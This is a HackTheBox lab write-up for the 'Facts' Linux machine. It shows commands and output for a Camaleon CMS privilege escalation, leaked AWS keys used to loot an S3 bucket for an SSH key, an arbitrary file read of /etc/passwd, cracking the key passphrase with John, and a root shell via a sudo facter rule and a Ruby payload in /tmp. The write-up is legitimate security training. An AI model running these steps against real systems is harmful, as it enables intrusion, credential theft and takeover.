---
layout: default
title: "HTB – Facts | Costabo1"
description: "HackTheBox writeup for the Facts machine by Costabo1"
---

<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&display=swap');

:root {
  --bg:      #0d0f14;
  --surface: #13161e;
  --border:  #1e2230;
  --accent:  #00ff9d;
  --accent2: #00b8ff;
  --danger:  #ff4b4b;
  --warn:    #ffa94d;
  --muted:   #6b7280;
  --text:    #d1d5db;
  --heading: #f9fafb;
  --mono:    'Share Tech Mono', monospace;
  --sans:    'Syne', sans-serif;
}

*, *::before, *::after { box-sizing: border-box; }

body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--sans);
  line-height: 1.75;
  margin: 0;
  font-size: 15px;
}

/* ── Hero ───────────────────────────────────── */
.htb-hero {
  border-bottom: 1px solid var(--border);
  padding: 3rem 1.5rem 2rem;
  background: linear-gradient(135deg, #0d0f14 60%, #0a1a12 100%);
  position: relative;
  overflow: hidden;
}
.htb-hero::before {
  content: "";
  position: absolute;
  inset: 0;
  background: repeating-linear-gradient(
    0deg, transparent, transparent 39px, rgba(0,255,157,.04) 40px
  );
  pointer-events: none;
}
.htb-hero .inner { position: relative; z-index: 1; }

.badge-row { display: flex; flex-wrap: wrap; gap: .4rem; margin-bottom: 1rem; }
.badge {
  font-family: var(--mono);
  font-size: .7rem;
  padding: .2rem .6rem;
  border-radius: 3px;
  border: 1px solid;
  letter-spacing: .05em;
  text-transform: uppercase;
}
.badge-easy    { color: var(--accent);  border-color: var(--accent);  background: rgba(0,255,157,.07); }
.badge-linux   { color: var(--accent2); border-color: var(--accent2); background: rgba(0,184,255,.07); }
.badge-retired { color: var(--muted);   border-color: var(--muted);   background: rgba(107,114,128,.07); }

.htb-hero h1 {
  font-family: var(--sans);
  font-weight: 800;
  font-size: clamp(1.7rem, 6vw, 3rem);
  color: var(--heading);
  margin: 0 0 .4rem;
  letter-spacing: -.02em;
  line-height: 1.15;
}
.htb-hero h1 span { color: var(--accent); }
.htb-hero .subtitle {
  font-family: var(--mono);
  color: var(--muted);
  font-size: .8rem;
  margin: 0;
}

/* ── Layout wrap ─────────────────────────────── */
.content-wrap {
  max-width: 860px;
  margin: 0 auto;
  padding: 0 1.25rem 4rem;
}

/* ── Info grid ───────────────────────────────── */
.info-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
  gap: 1px;
  background: var(--border);
  border: 1px solid var(--border);
  border-radius: 6px;
  overflow: hidden;
  margin: 2rem 0;
  font-family: var(--mono);
  font-size: .8rem;
}
.info-grid .cell { background: var(--surface); padding: .85rem 1rem; }
.info-grid .cell .lbl {
  color: var(--muted);
  font-size: .65rem;
  text-transform: uppercase;
  letter-spacing: .1em;
  margin-bottom: .2rem;
}
.info-grid .cell .val { color: var(--heading); }

/* ── Section headings ────────────────────────── */
h2 {
  font-family: var(--sans);
  font-weight: 700;
  font-size: 1.2rem;
  color: var(--heading);
  margin: 2.5rem 0 .9rem;
  padding-bottom: .4rem;
  border-bottom: 1px solid var(--border);
}
h3 {
  font-family: var(--mono);
  font-weight: 700;
  color: var(--accent);
  font-size: .9rem;
  margin: 1.75rem 0 .5rem;
  letter-spacing: .04em;
  text-transform: uppercase;
}

/* ── Code blocks ─────────────────────────────── */
pre, code { font-family: var(--mono); }
pre {
  background: #080a0f;
  border: 1px solid var(--border);
  border-left: 3px solid var(--accent);
  border-radius: 4px;
  padding: 1rem 1.1rem;
  overflow-x: auto;
  font-size: .8rem;
  color: #a8ffcb;
  margin: .75rem 0 1.25rem;
  -webkit-overflow-scrolling: touch;
}
code {
  background: rgba(0,255,157,.07);
  color: var(--accent);
  padding: .1em .4em;
  border-radius: 3px;
  font-size: .85em;
  word-break: break-word;
}
pre code { background: none; color: inherit; padding: 0; font-size: inherit; word-break: normal; }

/* ── Callout boxes ───────────────────────────── */
.callout {
  border: 1px solid;
  border-radius: 5px;
  padding: .8rem 1rem;
  margin: 1rem 0 1.25rem;
  font-size: .875rem;
  display: flex;
  gap: .65rem;
  align-items: flex-start;
}
.ci { flex-shrink: 0; font-size: 1rem; line-height: 1.6; }
.cb { flex: 1; }
.cb strong {
  display: block;
  margin-bottom: .15rem;
  font-size: .72rem;
  text-transform: uppercase;
  letter-spacing: .08em;
}
.callout.info   { border-color: rgba(0,184,255,.3);  background: rgba(0,184,255,.05);  color: #93c5fd; }
.callout.warn   { border-color: rgba(255,169,77,.3); background: rgba(255,169,77,.05); color: #fcd34d; }
.callout.danger { border-color: rgba(255,75,75,.3);  background: rgba(255,75,75,.05);  color: #fca5a5; }
.callout.win    { border-color: rgba(0,255,157,.3);  background: rgba(0,255,157,.05);  color: var(--accent); }

/* ── Step list ───────────────────────────────── */
.steps { counter-reset: step; list-style: none; padding: 0; margin: .75rem 0 1.25rem; }
.steps li {
  counter-increment: step;
  position: relative;
  padding: .7rem 1rem .7rem 3rem;
  margin-bottom: .4rem;
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 5px;
  font-size: .9rem;
}
.steps li::before {
  content: counter(step, decimal-leading-zero);
  position: absolute;
  left: .85rem;
  top: 50%;
  transform: translateY(-50%);
  font-family: var(--mono);
  font-size: .7rem;
  color: var(--accent);
}

/* ── Tool pills ──────────────────────────────── */
.tool-list {
  display: flex;
  flex-wrap: wrap;
  gap: .4rem;
  margin: .5rem 0 1.5rem;
  padding: 0;
  list-style: none;
}
.tool-list li {
  font-family: var(--mono);
  font-size: .72rem;
  padding: .22rem .65rem;
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 3px;
  color: var(--accent2);
  letter-spacing: .04em;
}

/* ── Diff bar ────────────────────────────────── */
.diff-bar { margin: .25rem 0 1.5rem; }
.diff-bar .track {
  height: 4px;
  background: var(--border);
  border-radius: 99px;
  width: min(200px, 60%);
}
.diff-bar .fill {
  height: 100%;
  border-radius: 99px;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
}
.diff-bar .lbl {
  font-family: var(--mono);
  font-size: .68rem;
  color: var(--muted);
  margin-top: .3rem;
}

/* ── Cred table ──────────────────────────────── */
.cred-table {
  width: 100%;
  border-collapse: collapse;
  font-family: var(--mono);
  font-size: .78rem;
  margin: .75rem 0 1.25rem;
  overflow-x: auto;
  display: block;
  -webkit-overflow-scrolling: touch;
}
.cred-table th {
  background: var(--surface);
  color: var(--muted);
  font-size: .65rem;
  text-transform: uppercase;
  letter-spacing: .1em;
  padding: .5rem .9rem;
  text-align: left;
  border: 1px solid var(--border);
}
.cred-table td {
  border: 1px solid var(--border);
  padding: .5rem .9rem;
  color: var(--text);
  word-break: break-all;
}
.cred-table tr:hover td { background: rgba(255,255,255,.02); }

/* ── Flag block ──────────────────────────────── */
.flag-block {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: .75rem;
  background: rgba(0,255,157,.04);
  border: 1px solid rgba(0,255,157,.2);
  border-radius: 6px;
  padding: .9rem 1.1rem;
  margin: 1.25rem 0;
  font-family: var(--mono);
}
.flag-block .fi { font-size: 1.3rem; flex-shrink: 0; }
.flag-block .fl {
  font-size: .65rem;
  color: var(--muted);
  text-transform: uppercase;
  letter-spacing: .1em;
  white-space: nowrap;
}
.flag-block .fv {
  color: var(--accent);
  font-size: .83rem;
  word-break: break-all;
  flex: 1;
  min-width: 0;
}

/* ── Attack chain ────────────────────────────── */
.chain {
  display: flex;
  flex-direction: column;
  gap: 0;
  margin: 1rem 0 1.5rem;
  font-family: var(--mono);
  font-size: .8rem;
}
.chain-step {
  display: flex;
  align-items: flex-start;
  gap: .75rem;
}
.chain-step .dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: var(--accent);
  margin-top: .35rem;
  flex-shrink: 0;
}
.chain-step .line-wrap {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 0;
  flex-shrink: 0;
  margin-top: .3rem;
}
.chain-step .line-wrap .d { width: 10px; height: 10px; border-radius: 50%; background: var(--accent); }
.chain-step .line-wrap .v { width: 1px; height: 28px; background: rgba(0,255,157,.25); }
.chain-node {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 5px;
  padding: .55rem .9rem;
  margin-bottom: 0;
  color: var(--text);
  position: relative;
}
.chain-node .tag {
  font-size: .62rem;
  color: var(--accent);
  text-transform: uppercase;
  letter-spacing: .1em;
  margin-bottom: .1rem;
}
.chain-connector {
  width: 1px;
  height: 18px;
  background: rgba(0,255,157,.2);
  margin: 0 0 0 4px;
}
.chain-item { margin-bottom: 4px; }

/* ── Prose ───────────────────────────────────── */
p { margin: .6rem 0; }
a { color: var(--accent2); text-decoration: none; }
a:hover { text-decoration: underline; }
hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
ul:not(.tool-list):not(.steps) { padding-left: 1.25rem; }
ul:not(.tool-list):not(.steps) li { margin-bottom: .3rem; }
strong { color: var(--heading); }

/* ── Footer ──────────────────────────────────── */
.writeup-footer {
  border-top: 1px solid var(--border);
  padding: 1.25rem 1.5rem;
  font-family: var(--mono);
  font-size: .72rem;
  color: var(--muted);
  text-align: center;
  margin-top: 2rem;
}
.writeup-footer span { color: var(--accent); }

/* ── Mobile tweaks ───────────────────────────── */
@media (max-width: 600px) {
  .htb-hero { padding: 2rem 1rem 1.5rem; }
  .content-wrap { padding: 0 1rem 3rem; }
  .info-grid { grid-template-columns: repeat(3, 1fr); }
  h2 { font-size: 1.05rem; margin-top: 2rem; }
  pre { font-size: .75rem; padding: .85rem; }
  .cred-table { font-size: .72rem; }
}
</style>

<!-- HERO -->
<div class="htb-hero">
  <div class="content-wrap inner">
    <div class="badge-row">
      <span class="badge badge-easy">Easy</span>
      <span class="badge badge-linux">Linux</span>
      <span class="badge badge-retired">Retired</span>
    </div>
    <h1>🧠 HackTheBox — <span>Facts</span></h1>
    <p class="subtitle">costabo1 &nbsp;·&nbsp; writeup &nbsp;·&nbsp; 2025</p>
  </div>
</div>

<div class="content-wrap">

<!-- Info grid -->
<div class="info-grid">
  <div class="cell"><div class="lbl">OS</div><div class="val">Linux</div></div>
  <div class="cell"><div class="lbl">Difficulty</div><div class="val">Easy</div></div>
  <div class="cell"><div class="lbl">Points</div><div class="val">20</div></div>
  <div class="cell"><div class="lbl">CVEs</div><div class="val">2025-2304 · 2024-46987</div></div>
  <div class="cell"><div class="lbl">Status</div><div class="val">Retired</div></div>
  <div class="cell"><div class="lbl">Author</div><div class="val">Costabo1</div></div>
</div>

---

## 🔭 Overview

Facts is an easy-difficulty Linux machine that walks through a realistic multi-stage attack chain. You'll register an account on a vulnerable CMS, exploit it to gain admin access, discover leaked AWS credentials in the admin panel, abuse a misconfigured S3 bucket to extract a private SSH key, crack it, and finally escalate to root via a dangerous `sudo` rule.

**Attack chain at a glance:**

<div style="margin:1rem 0 1.5rem">
  <div class="chain-item">
    <div class="chain-node"><div class="tag">Step 1 — Web</div>Open registration → create account on Camaleon CMS 2.9.0</div>
    <div class="chain-connector"></div>
  </div>
  <div class="chain-item">
    <div class="chain-node"><div class="tag">Step 2 — CVE-2025-2304</div>Privilege escalation within CMS → admin access</div>
    <div class="chain-connector"></div>
  </div>
  <div class="chain-item">
    <div class="chain-node"><div class="tag">Step 3 — Cloud</div>AWS credentials exposed in admin panel → S3 bucket enumeration</div>
    <div class="chain-connector"></div>
  </div>
  <div class="chain-item">
    <div class="chain-node"><div class="tag">Step 4 — CVE-2024-46987</div>File read vulnerability → SSH private key extracted from bucket</div>
    <div class="chain-connector"></div>
  </div>
  <div class="chain-item">
    <div class="chain-node"><div class="tag">Step 5 — Privesc</div>Crack SSH key → `sudo facter` abuse → root shell</div>
  </div>
</div>

<div class="diff-bar">
  <div class="track"><div class="fill" style="width:30%"></div></div>
  <div class="lbl">Difficulty feel: Easy</div>
</div>

## 🛠️ Tools Used

<ul class="tool-list">
  <li>nmap</li>
  <li>gobuster</li>
  <li>curl</li>
  <li>burpsuite</li>
  <li>aws-cli</li>
  <li>john</li>
  <li>ssh</li>
  <li>linpeas</li>
</ul>

---

## 🔍 Enumeration

### Port Scan

```bash
nmap -sC -sV -oN facts.nmap 10.129.35.249
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
```

Two ports open — SSH and a web server redirecting to `facts.htb`. Add it to `/etc/hosts` before proceeding.

### Web Enumeration

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
```

```
/admin/login      (Status: 200)
/admin/register   (Status: 200)
```

<div class="callout info">
  <span class="ci">ℹ️</span>
  <div class="cb"><strong>Finding</strong>The <code>/admin/register</code> endpoint is publicly accessible — no invite or admin approval required. This is the entry point.</div>
</div>

A new account was registered directly through the open endpoint:

- **Username:** `mew1222`
- **Password:** `mew121212`

Logging in revealed the application is running **Camaleon CMS 2.9.0**, which is vulnerable to **CVE-2025-2304** — an authenticated privilege escalation bug that allows a regular user to obtain admin-level access within the CMS.

---

## ⚡ Initial Foothold

### Step 1 — CMS Privilege Escalation (CVE-2025-2304)

After logging in with the newly created account, CVE-2025-2304 was used to escalate the CMS account to admin. This gives access to the full admin panel, including site configuration and media settings.

### Step 2 — AWS Credentials Exposed in Admin Panel

Inside the admin panel, AWS S3 configuration fields were visible and populated with live credentials:

<table class="cred-table">
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>Access Key</td><td>AKIAD337D13639BD95BE</td></tr>
  <tr><td>Secret Key</td><td>v9WTmIuNeeq4L5s72WobV6CQs6HIJVkrq7NdRpZb</td></tr>
  <tr><td>Region</td><td>us-east-1</td></tr>
  <tr><td>Endpoint</td><td>http://facts.htb:54321</td></tr>
</table>

### Step 3 — S3 Bucket Enumeration

Using these credentials with the AWS CLI against the local MinIO endpoint:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```

```
internal
randomfacts
```

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
```

The `internal` bucket contained a `.ssh/` directory. The private key was downloaded:

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
```

### Step 4 — File Read & User Discovery (CVE-2024-46987)

CVE-2024-46987 is an authenticated arbitrary file read in Camaleon CMS. Using the admin account obtained earlier, the exploit reads server-side files:

```bash
python3 adminpan.py -u http://facts.htb -l mew1222 -p mew121212 /etc/passwd
```

Relevant users extracted from `/etc/passwd`:

```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

### Step 5 — Crack SSH Key & Login

The `id_ed25519` private key is passphrase-protected. John the Ripper was used to crack it:

```bash
ssh2john id_ed25519 > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password cracked: `d*****z` *(redacted — find it yourself 🙂)*

The key belongs to the user `trivia`:

```bash
ssh -i id_ed25519 trivia@facts.htb
```

```
trivia@facts:~$ pwd
/home/trivia
```

### 🏴 User Flag

The user flag was located in william's home directory:

```bash
cat /home/william/user.txt
```

<div class="flag-block">
  <span class="fi">🏴</span>
  <span class="fl">user.txt</span>
  <span class="fv">f36************* &nbsp;(redacted)</span>
</div>

---

## 📈 Privilege Escalation

### Enumeration

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter --custom-dir /tmp
```

<div class="callout danger">
  <span class="ci">🔴</span>
  <div class="cb"><strong>Vulnerability</strong><code>facter</code> loads and executes Ruby scripts from whatever directory is passed via <code>--custom-dir</code>. Since <code>/tmp</code> is world-writable and this runs as root via sudo, it allows arbitrary code execution.</div>
</div>

### Exploitation

Drop a malicious Ruby script into `/tmp`:

```bash
echo 'exec("/bin/sh")' > /tmp/x.rb
```

Trigger it via the allowed sudo command:

```bash
sudo /usr/bin/facter --custom-dir /tmp
```

```
# whoami
root
# cd /root && ls
minio-binaries  ministack  root.txt  snap
```

<div class="callout win">
  <span class="ci">✅</span>
  <div class="cb"><strong>Root obtained</strong>Arbitrary Ruby execution via a user-writable sudo-allowed directory gave a direct root shell.</div>
</div>

### 🏁 Root Flag

```bash
cat /root/root.txt
```

<div class="flag-block">
  <span class="fi">🏁</span>
  <span class="fl">root.txt</span>
  <span class="fv">eda2a********** &nbsp;(redacted)</span>
</div>

---

## 📝 Key Takeaways

- **Open registration endpoints** on admin panels are a critical misconfiguration — always require approval or disable registration entirely.
- **Never store cloud credentials** in application config panels that authenticated users can read. Use IAM roles or secrets managers instead.
- **S3 misconfigurations** remain highly prevalent in real-world engagements. Always enumerate buckets when you find AWS credentials.
- **Arbitrary file read vulnerabilities** are often underestimated — they can expose SSH keys, credentials, and internal configs that lead to full compromise.
- **Sudo rules with user-writable directories** are extremely dangerous. The `--custom-dir` pattern is a common privesc vector with tools that load scripts or plugins.
- **Chaining** — none of these issues alone would have been critical, but together they resulted in full system compromise.

---

## 🔗 References

- [NVD — CVE-2025-2304](https://nvd.nist.gov/vuln/detail/CVE-2025-2304)
- [NVD — CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987)
- [Camaleon CMS GitHub](https://github.com/owen2345/camaleon-cms)
- [GTFOBins — facter](https://gtfobins.github.io/gtfobins/facter/)
- [AWS CLI S3 docs](https://docs.aws.amazon.com/cli/latest/reference/s3/)

</div>

<div class="writeup-footer">
  <span>costabo1</span> &nbsp;·&nbsp; HackTheBox Writeup &nbsp;·&nbsp; All content for educational purposes only
</div>
